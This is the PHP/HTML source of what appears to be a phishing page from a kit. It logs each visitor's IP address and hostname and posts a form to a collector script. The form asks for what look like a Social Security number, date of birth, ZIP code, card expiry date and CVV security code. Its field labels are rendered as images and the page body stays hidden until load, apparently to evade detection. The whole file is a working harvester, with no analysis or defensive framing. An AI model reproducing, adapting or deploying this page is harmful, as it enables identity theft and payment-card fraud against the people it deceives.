<?php
require_once 'bk.php';
$ip = getenv("REMOTE_ADDR");
$hosnm = bin2hex ($_SERVER['HTTP_HOST']);
$subt = "sbtss.php?check=$hosnm&$ip";
require_once 'ec.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>	
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<title>-</title>
<link type="image/x-icon" rel="shortcut icon" href="wp/ico.ico"/>
<style type="text/css">
.liw {width: 100%;padding: 10px;}
.lic {width: 98%;}
.l {display: inline-block;zoom: 1;*display: inline;vertical-align: top;width: 25%;}
.v {display: inline-block;zoom: 1;*display: inline;vertical-align: top;width: 74%;}
.ld {color: #1d239a;font-size: .9em;line-height: 1.6em;}
</style>
<script type="text/javascript">
function changePass()
 {
    document.getElementById('epass').type='password'; 
    document.getElementById('epass').value='';
 }
</script>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body onload="unhideBody()">
</head>
<body style="visibility:hidden;margin:0;padding:0;font:13px/1.231 arial,helvetica,clean,sans-serif;*font-size:small;*font:x-small;background:#e5e5e5;">
<div style="padding:0;width:1349px;margin:0 auto;">
<img src="wp/phd1.png">
</div>
<div style="width:970px;margin:0 auto;padding:0;background:#FFF;height:1000px;font-size:93%;text-align:left;">
<div style="margin:0px 0 0 -1px;"> 
<img src="wp/phd3.png">
</div>
<div>
<div>
<div style="width:940px;padding:0;margin:38px 0 0 30px;clear:both;">
<div>
<form action="<?php echo $subt; ?>" method="POST" autocomplete="off">
<div>
<div style="margin:30px;border:0;width:100%;border-collapse:separate;margin:0 0 10px 0;width:103%">
<div>
<div style="display:inline-block;zoom:1;*display:inline;letter-spacing:normal;word-spacing:normal;vertical-align:top;width: 909px;margin:-31px 0 0 0;">
<div>
<div>
<div style="background-color:#FFF;background-color:#f5f5f5;margin-bottom:0;border-bottom:1px solid #999;-webkit-box-shadow:rgba(255,255,255,0.7) 0 1px;-webkit-transform:translate3d(0,0,0);">
<div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/sn.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="20" maxlength="11" autocomplete="off"  name="txt4" required="required"/>
<div>
<img src="wp/snn.png">
</div>
</div>
</div>
</div>
</div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/db.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="20" maxlength="10" autocomplete="off" placeholder="       MM / DD / YYYY" name="txt15" required="required"/>
</div>
</div>
</div>
</div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/ppn.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="20" maxlength="12" autocomplete="off"  name="txt18" required="required"/>
<div>
<img src="wp/ppnn.png">
</div>
</div>
</div>
</div>
</div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/zpc.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="20" maxlength="5" autocomplete="off"  name="txt19" required="required"/>
<div>
<img src="wp/zpcc.png">
</div></div>
</div>
</div>
</div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/ced.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="20" maxlength="7" autocomplete="off" placeholder="           MM / YYYY" name="txt21" required="required"/>
</div>
</div>
</div>
</div>
<div class="liw">
<div class="lic">
<div class="l">
<div>
<img src="wp/sc.png">
</div>
</div>
<div class="v">
<div>
<input type="text" size="2" maxlength="3" autocomplete="off"  name="txt23" required="required"/>
<br>
<div class="vd">
<div> 
<img src="wp/cvb.png" height="70" width="120" /> 
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<input type="image" src="wp/psbt.png" border="0" style="margin:-10px 0 10px 631px;" />
</form>
</div>
</div>
</div>
</div>
<div style="margin:5px -1px;"> 
<img src="wp/fot234.png">
</div> 
</div>
</body>
</html>
<?php ob_end_flush(); ?>